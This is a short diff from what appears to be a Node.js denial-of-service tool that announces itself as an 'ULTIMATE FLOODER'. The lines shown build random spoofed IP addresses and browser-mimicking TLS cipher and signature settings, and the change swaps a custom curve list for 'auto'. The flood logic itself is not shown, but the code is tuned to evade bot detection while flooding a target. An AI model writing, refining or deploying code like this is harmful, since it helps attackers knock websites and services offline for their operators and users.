@@ -51,8 +51,7 @@ const spoofedIP = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.ra
 
 const ciphers = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";
 const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384";
-const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521";
-const secureContext = tls.createSecureContext({ ciphers, sigalgs, honorCipherOrder: true, ecdhCurve });
+const secureContext = tls.createSecureContext({ ciphers, sigalgs, honorCipherOrder: true, ecdhCurve: "auto" });
 
 if (cluster.isMaster) {
     console.log("--- ULTIMATE FLOODER ACTIVATED ---");
